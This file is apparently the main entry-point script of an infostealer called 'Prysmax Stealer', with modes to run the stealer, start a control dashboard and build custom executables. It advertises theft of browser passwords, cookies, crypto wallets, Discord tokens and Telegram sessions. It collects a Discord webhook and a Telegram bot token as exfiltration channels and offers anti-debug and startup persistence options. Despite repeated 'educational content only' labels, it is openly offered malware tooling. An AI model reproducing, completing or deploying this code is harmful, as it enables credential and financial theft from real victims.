#!/usr/bin/env python3
"""
Prysmax Stealer - Main Entry Point
Educational content only

This is a comprehensive stealer application with web dashboard interface
developed for educational and research purposes only.

Features:
- Advanced web dashboard with real-time statistics
- Multi-browser password and cookie extraction
- Cryptocurrency wallet stealing
- Discord token grabbing
- Telegram session hijacking
- Screenshot capture
- System information collection
- Advanced protection and evasion techniques
- Builder interface for custom builds
- Multiple delivery methods (Discord, Telegram)

Usage:
    python main.py --mode [stealer|dashboard|builder]
    
    stealer   - Run the stealer functionality
    dashboard - Start the web dashboard server
    builder   - Build custom stealer executable
"""

import os
import sys
import argparse
import json
from pathlib import Path

# Add project root to Python path
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root))

def run_stealer():
    """Run the stealer functionality"""
    try:
        from core.stealer import PrysmaxStealer
        
        print("=" * 60)
        print("🔥 PRYSMAX STEALER v2.0")
        print("=" * 60)
        print("Educational content only")
        print()
        
        stealer = PrysmaxStealer()
        stealer.run_stealer()
        
    except Exception as e:
        print(f"[ERROR] Stealer execution failed: {e}")
        return False
    
    return True

def run_dashboard():
    """Start the web dashboard server"""
    try:
        print("=" * 60)
        print("🌐 PRYSMAX WEB DASHBOARD")
        print("=" * 60)
        print("Starting web dashboard server...")
        print("Access the dashboard at: http://localhost:5000")
        print("Default credentials: admin / prysmax123")
        print()
        
        # Add web directory to path and change to web directory
        web_dir = project_root / "web"
        sys.path.insert(0, str(web_dir))
        
        # Change to web directory for proper relative imports and database paths
        original_cwd = os.getcwd()
        os.chdir(web_dir)
        
        try:
            # Import and run Flask app
            from app import app, init_db
            
            # Initialize database
            init_db()
            
            # Start server
            app.run(host='0.0.0.0', port=5000, debug=False)
        finally:
            # Restore original working directory
            os.chdir(original_cwd)
        
    except Exception as e:
        print(f"[ERROR] Dashboard startup failed: {e}")
        return False
    
    return True

def run_builder():
    """Run the stealer builder"""
    try:
        from builder.builder import StealerBuilder
        
        print("=" * 60)
        print("🔨 PRYSMAX STEALER BUILDER")
        print("=" * 60)
        print("Educational content only")
        print()
        
        # Load configuration
        config_path = project_root / "config" / "config.json"
        with open(config_path, 'r') as f:
            config = json.load(f)
        
        # Interactive build configuration
        print("Configure your stealer build:")
        print()
        
        # Required webhook
        webhook_url = input("Enter Discord webhook URL (required): ").strip()
        if not webhook_url:
            print("[ERROR] Discord webhook URL is required!")
            return False
        
        # Optional configuration
        filename = input("Enter output filename (default: stealer): ").strip() or "stealer"
        telegram_token = input("Enter Telegram bot token (optional): ").strip()
        telegram_chat = input("Enter Telegram chat ID (optional): ").strip()
        
        # Features selection
        print("\nSelect features to include (y/n):")
        passwords = input("Include passwords (Y/n): ").strip().lower() not in ['n', 'no']
        cookies = input("Include cookies (Y/n): ").strip().lower() not in ['n', 'no']
        discord = input("Include Discord tokens (Y/n): ").strip().lower() not in ['n', 'no']
        wallets = input("Include wallets (Y/n): ").strip().lower() not in ['n', 'no']
        screenshot = input("Include screenshot (Y/n): ").strip().lower() not in ['n', 'no']
        
        # Protection options
        print("\nSelect protection options (y/n):")
        anti_debug = input("Enable anti-debug (y/N): ").strip().lower() in ['y', 'yes']
        startup = input("Enable startup persistence (y/N): ").strip().lower() in ['y', 'yes']
        
        build_config = {
            "filename": filename,
            "webhook_url": webhook_url,
            "telegram_config": {
                "bot_token": telegram_token,
                "chat_id": telegram_chat
            },
            "features": {
                "passwords": passwords,
                "cookies": cookies,
                "discord_tokens": discord,
                "wallets": wallets,
                "telegram": bool(telegram_token and telegram_chat),
                "screenshot": screenshot
            },
            "protection": {
                "anti_debug": anti_debug,
                "startup": startup,
                "melt": False,
                "upx_packing": False,
                "crypto_clipper": False
            }
        }
        
        print(f"\n[INFO] Building stealer with filename: {filename}")
        print(f"[INFO] Features enabled: {[k for k, v in build_config['features'].items() if v]}")
        print(f"[INFO] Protection enabled: {[k for k, v in build_config['protection'].items() if v]}")
        print()
        
        # Build stealer
        builder = StealerBuilder(config)
        result = builder.build_stealer(build_config)
        
        if result:
            print(f"[SUCCESS] Stealer built successfully: {result}")
        else:
            print("[ERROR] Build failed!")
            return False
        
    except Exception as e:
        print(f"[ERROR] Builder execution failed: {e}")
        return False
    
    return True

def show_banner():
    """Display application banner"""
    banner = """
    ██████╗ ██████╗ ██╗   ██╗███████╗███╗   ███╗ █████╗ ██╗  ██╗
    ██╔══██╗██╔══██╗╚██╗ ██╔╝██╔════╝████╗ ████║██╔══██╗╚██╗██╔╝
    ██████╔╝██████╔╝ ╚████╔╝ ███████╗██╔████╔██║███████║ ╚███╔╝ 
    ██╔═══╝ ██╔══██╗  ╚██╔╝  ╚════██║██║╚██╔╝██║██╔══██║ ██╔██╗ 
    ██║     ██║  ██║   ██║   ███████║██║ ╚═╝ ██║██║  ██║██╔╝ ██╗
    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
    
    Advanced Stealer & Dashboard Platform v2.0
    Educational content only - Use responsibly
    
    Telegram: @prysmaxc2 | Web: prysmax.club
    """
    print(banner)

def main():
    """Main entry point"""
    show_banner()
    
    parser = argparse.ArgumentParser(
        description="Prysmax Stealer - Advanced Information Gathering Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    python main.py --mode dashboard    # Start web dashboard
    python main.py --mode stealer      # Run stealer functionality  
    python main.py --mode builder      # Build custom executable
        """
    )
    
    parser.add_argument(
        '--mode', 
        choices=['stealer', 'dashboard', 'builder'],
        default='dashboard',
        help='Operation mode (default: dashboard)'
    )
    
    parser.add_argument(
        '--config',
        default='config/config.json',
        help='Configuration file path'
    )
    
    parser.add_argument(
        '--version',
        action='version',
        version='Prysmax Stealer v2.0'
    )
    
    args = parser.parse_args()
    
    # Verify configuration file exists
    config_path = project_root / args.config
    if not config_path.exists():
        print(f"[ERROR] Configuration file not found: {config_path}")
        return 1
    
    # Execute based on mode
    success = False
    
    if args.mode == 'stealer':
        success = run_stealer()
    elif args.mode == 'dashboard':
        success = run_dashboard()
    elif args.mode == 'builder':
        success = run_builder()
    
    return 0 if success else 1

if __name__ == "__main__":
    try:
        exit_code = main()
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print("\n[INFO] Operation cancelled by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[FATAL] Unexpected error: {e}")
        sys.exit(1)

